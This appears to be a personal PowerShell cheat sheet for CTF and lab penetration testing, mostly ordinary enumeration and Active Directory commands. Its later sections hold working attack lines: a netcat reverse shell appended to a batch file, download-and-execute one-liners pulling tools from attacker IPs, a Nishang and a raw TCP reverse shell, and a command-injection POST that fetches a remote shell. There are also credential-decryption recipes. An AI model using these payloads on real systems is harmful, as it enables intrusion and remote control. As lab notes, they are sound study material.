# POWERSHELL
## Refs
https://tryhackme.com/room/powershell


## PowerShell history

	%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

## Help

	Get-Help Command-Name

	Get-Command Verb-* OR *-Noun
	Get-Command New-*
	Get-Command | Get-Member -MemberType Method

	Get-Command | Where-Object -Property Name -like Get-Serv*
	Get-Command | measure

	(Get-Command Get-LocalUser).Parameters

## Services
https://www.shellhacks.com/windows-list-services-cmd-powershell/

		Get-Service | Where-Object -Property Status -eq Running

## Encoding

	[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($data))

## Users

	Get-LocalUser | Where-Object -Property PasswordRequired -Match false

	wmic useraccount where name='%username%' get sid

	Get-WmiObject -Class Win32_UserAccount

## System

	Get system infos
	Get-Hotfix
	Get-ExecutionPolicy
	
	$ENV:PROCESSOR_ARCHITECTURE
	$env:UserName
	$env:UserDomain
	$env:ComputerName
	
	$FindDate=Get-Date -Year 2016 -Month 06 -Day 24
	
	Get Architecture
	wmic OS get OSArchitecture

## Processes
https://thinkpowershell.com/get-process-name-and-owner-user-name/

	Get-Process -Id (Get-NetTCPConnection -LocalPort YourPortNumberHere).OwningProcess
	Get-Process -Name Calculator -IncludeUserName

## Search for files
https://devblogs.microsoft.com/scripting/use-windows-powershell-to-search-for-files/

	gci
	gci -hidden
	Get-ChildItem C:\* -Recurse | Select-String -pattern API_KEY

## Get Scheduled Tasks

	Get-ScheduledTask

## File manipulation

	Get-Location

	Test-Path C:\Users\Administrator\Documents\Passwords
	
	Get-Childitem –Path C:\
	Get-Childitem –Path C:\ -Recurse
	Get-Childitem –Path C:\ -Recurse -ErrorAction SilentlyContinue

	Get-Childitem –Path C:\ -Recurse –force -ErrorAction SilentlyContinue (force to enumerate hidden folders)

	Get-Childitem –Path C:\ -Include *HSG* -Recurse -ErrorAction SilentlyContinue

	Get-ChildItem -Path C:\ -Include *.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue

	Get-Childitem –Path C:\ -Include *HSG* -Exclude *.JPG,*.MP3,*.TMP -File -Recurse -ErrorAction SilentlyContinue

## File permissions

	Get-Acl
	Get-ChildItem | Get-Acl
	Dir | Get-Acl
	Get-Acl | fl

### Adding line to a file

	htb\amanda@SIZZLE documents> echo "" | out-file -encoding ASCII -append clean.bat

	echo '\windows\system32\spool\drivers\color\n.exe -e cmd.exe 10.10.14.4 443' | out-file -encoding ASCII -append test.bat

### MD5 Sum of a file

	Get-FileHash '\program files\interesting-file.txt.txt' -Algorithm MD5

## Decrypt a password encoded in powershell
https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertto-securestring?view=powershell-7  
https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring?view=powershell-7  
https://pscustomobject.github.io/powershell/howto/PowerShell-Create-Credential-Object/  

**!!! User dependent !!!**

- A plain text password can be converted into a secure-string and then into a crypted string.

		Secure-String: "hasdpoiquiwr3491039847"
		Crypted String: "01000000d08c9ddf0115d1118c7a00c04fc297eb0100000011d9a9af9398c648be30a7dd764d1f3a000000000200000000001066000000010000200000004f4016524600b3914d83c0f88322cbed77ed3e3477dfdc9df1a2a5822021439b000000000e8000000002000020000000dd198d09b343e3b6fcb9900b77eb64372126aea207594bbe5bb76bf6ac5b57f4500000002e94c4a2d8f0079b37b33a75c6ca83efadabe077816aa2221ff887feb2aa08500f3cf8d8c5b445ba2815c5e9424926fca73fb4462a6a706406e3fc0d148b798c71052fc82db4c4be29ca8f78f0233464400000008537cfaacb6f689ea353aa5b44592cd4963acbf5c2418c31a49bb5c0e76fcc3692adc330a85e8d8d856b62f35d8692437c2f1b40ebbf5971cd260f738dada1a7"

- To decrypt a crypted string

		$pass = '01000000d08c9ddf0115d1118c7a00c04fc297eb0100000011d9a9af9398c648be30a7dd764d1f3a000000000200000000001066000000010000200000004f4016524600b3914d83c0f88322cbed77ed3e3477dfdc9df1a2a5822021439b000000000e8000000002000020000000dd198d09b343e3b6fcb9900b77eb64372126aea207594bbe5bb76bf6ac5b57f4500000002e94c4a2d8f0079b37b33a75c6ca83efadabe077816aa2221ff887feb2aa08500f3cf8d8c5b445ba2815c5e9424926fca73fb4462a6a706406e3fc0d148b798c71052fc82db4c4be29ca8f78f0233464400000008537cfaacb6f689ea353aa5b44592cd4963acbf5c2418c31a49bb5c0e76fcc3692adc330a85e8d8d856b62f35d8692437c2f1b40ebbf5971cd260f738dada1a7'

		$user = 'htb\tom'

		$unsecure = ConvertTo-String -String $pass

		$creds = New-Object System.Management.Automation.PSCredential($user, $unsecure)

		$cred.GetNetworkCredential() | fl

- To dump a secure-string

		$pass = "hasdpoiquiwr3491039847" | convertto-securestring
		$user = "HTB\tom"
		$cred = New-Object System.Management.Automation.PSCredential($user, $pass)

		$cred.GetNetworkCredential() | fl

	**If the password is into a file, then we can import the file into powershell like so **

		$credential = Import-CliXml -Path U:\Users\administratoroot.txt
		$credential.GetNetworkCredential().Password


## Active Directory

	Get AD Info
	Get-NetComputer -fulldata | select operatingsystem
	Get-NetUser | select cn
	Get-ADDomain
	[-AuthType <ADAuthType>]
	[-Credential <PSCredential>]
	[-Current <ADCurrentDomainType>]
	[-Server <String>]
	[<CommonParameters>]

	**Get AD groups -**  https://docs.microsoft.com/en-us/powershell/module/addsadministration/get-adgroupmember?view=win10-ps

	Get-ADGroupMember
	[-AuthType <ADAuthType>]
	[-Credential <PSCredential>]
	[-Identity] <ADGroup>
	[-Partition <String>]
	[-Recursive]
	[-Server <String>]
	[<CommonParameters>]

	Get-ADPrincipalGroupMembership username | select name

	**Add AD group member -**  https://docs.microsoft.com/en-us/powershell/module/addsadministration/add-adgroupmember?view=win10-ps

	Add-ADGroupMember -Identity SvcAccPSOGroup -Members SQL01,SQL02

	**Get AD Object infos (Users, groups etc...)**

	Get-ADObject -filter ‘isDeleted -eq $true’ -includeDeletedObjects -Properties *

### Create AD user

	Get-Command New-ADUser –Syntax (Help)
	Import-Module ActiveDirectory

- Basic syntax

		New-ADUser -Name "Jack Robinson" -GivenName "Jack" -Surname "Robinson" -SamAccountName "J.Robinson" -UserPrincipalName "J.Robinson@enterprise.com" -Path "OU=Managers,DC=enterprise,DC=com" -AccountPassword(Read-Host -AsSecureString "Input Password") -Enabled $true

		New-ADUser B.Johnson

- Example

		Get-ADUser J.Robinson -Properties CanonicalName, Enabled, GivenName, Surname, Name, UserPrincipalName, samAccountName, whenCreated, PasswordLastSet  | Select CanonicalName, Enabled, GivenName, Surname, Name, UserPrincipalName, samAccountName, whenCreated, PasswordLastSet

		Get-ADUser -Filter * -Properties samAccountName | select samAccountName (check user creation)

		Create user (with more params like passwords etc...)

## Drives and Shares

	Get-SMBShare
	Get-SmbShare -Name "VMS1"
	Get-SmbShare -Name "VMS1" | Format-List

	Get-PSDrive

### Create SMB Shares

	$pass="FooBoo"|ConvertTo-SecureString -AsPlainText -Force
	$Cred = New-Object System.Management.Automation.PsCredential('user@domain',$pass)
	New-PSDrive -name j -Root \\server\share -Credential $cred -PSProvider filesystem


## Registry
### Get registry keys and properties
https://docs.microsoft.com/en-us/powershell/scripting/samples/working-with-registry-entries?view=powershell-7

	Get-Item -Path Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion | Select-Object -ExpandProperty Property

	OR

	Get-ItemProperty -Path Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion

## Download file from server

	powershell –c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.10/nc64.exe','C:\tmp\nc64.exe')"
	powershell -c "IEX New-Object Net.WebClient.DownloadString('http://10.10.14.4/winpeas.exe','\users\www-data\winpeas.exe')"

OR

	powershell -c Invoke-WebRequest http://10.9.152.109/getshell.bat -OutFile \users\bruce\Music\getshell.bat
	Invoke-WebRequest http://10.10.14.10/shell.ps1 -OutFile C:\tmp\Installer.exe
	powershell -c Invoke-WebRequest http://10.9.152.109/getshell.bat -OutFile \users\bruce\Music\getshell.bat

## Make a WebRequest without curl

	Invoke-WebRequest 'http://www.example.org/' | Select-Object -Expand Content
	(Invoke-WebRequest 'http://www.example.org/').Content

### Make a request without internet explorer installed

	Invoke-WebRequest -Uri $url -UseBasicParsing

## Reverse shell
### Nishang

	powershell iex (New-Object Net.WebClient).DownloadString('http://10.0.152.109/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress 10.9.152.109 -Port 1111

### One liner

	$client = New-Object System.Net.Sockets.TCPClient("192.168.18.129",2222);
	$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};

	while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);

	$sendback = (iex $data 2>&1 | Out-String );
	$sendback2 = $sendback + "PS " + (pwd).Path + "> ";

	$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};

	$client.Close()

	$client = New-Object System.Net.Sockets.TCPClient("192.168.18.129",2222); $stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

### Invoke a remote shell from an ajax POST request
Nishang: https://github.com/samratashok/nishang  
Cheat sheet: https://gist.github.com/jivoi/c354eaaf3019352ce32522f916c03d70

	var http = new XMLHttpRequest();
	var url = "http://localhost/admin/backdoorchecker.php";

	var params = 'cmd=dir | powershell.exe -exec bypass -C "IEX(New-Object Net.WebClient).DownloadString(\'http://10.10.14.16/nishang-shell-5000.ps1\')"';

	http.open("POST", url);
	http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
	http.withCredentials = true;
	http.send(params);
